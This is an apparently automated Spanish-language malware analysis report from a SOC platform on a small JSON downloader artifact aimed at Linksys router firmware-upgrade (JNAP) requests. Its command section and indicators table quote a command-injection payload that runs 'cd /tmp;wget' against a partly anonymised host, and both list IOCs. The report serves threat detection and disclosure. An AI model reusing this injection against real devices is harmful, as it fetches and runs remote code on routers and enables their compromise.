# 🧬 Payload Analysis

`d9bdff141a2613e5f3a62a5760af35c09f05a9ed7e9170061b7eb5a341863bdc`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d9bdff141a2613e5f3a62a5760af35c09f05a9ed7e9170061b7eb5a341863bdc`
- **MD5:** `367bf92b31ef3de035b856d1a0517c8e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | JSON text data |
| Tamaño | 251 B |
| Entropía | 5.16 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=JSON text data; iocs=5

## 🖥️ Comandos observados / extraídos

```text
{"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd /tmp;wget hxxp://91.92.40.XXX/w
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| url | hxxp://linksys[.]com/jnap/firmware/Upgrade | strings |
| hash | d9bdff141a2613e5f3a62a5760af35c09f05a9ed7e9170061b7eb5a341863bdc | static_analysis |
| command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd /tmp;wget hxxp://91.92.40.XXX/w | strings |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
